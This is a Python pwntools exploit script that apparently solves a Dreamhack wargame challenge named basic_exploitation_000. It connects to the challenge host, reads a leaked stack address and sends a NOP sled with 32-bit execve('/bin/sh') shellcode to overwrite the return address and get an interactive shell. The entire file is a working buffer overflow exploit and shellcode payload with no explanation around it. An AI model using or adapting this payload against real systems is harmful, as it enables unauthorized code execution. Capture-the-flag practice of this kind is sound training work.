#!/usr/bin/python 
from pwn import *

#context.arch = 'i386'
context.log_level = 'debug'
#p = process("./basic_exploitation_000")
p = remote("host1.dreamhack.games", 8237)
elf = ELF("./basic_exploitation_000")

p.recvuntil("buf = (")
buf = int(p.recv(10), 16)
log.info("buf : "+hex(buf))

#gdb.attach(p)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x22\x2c\x17\xcd\x80"

pay = '\x90'*48 + shellcode +'\x90'*(0x84-48-len(shellcode)) + p32(buf)
p.sendlineafter("\n", pay)

p.interactive()
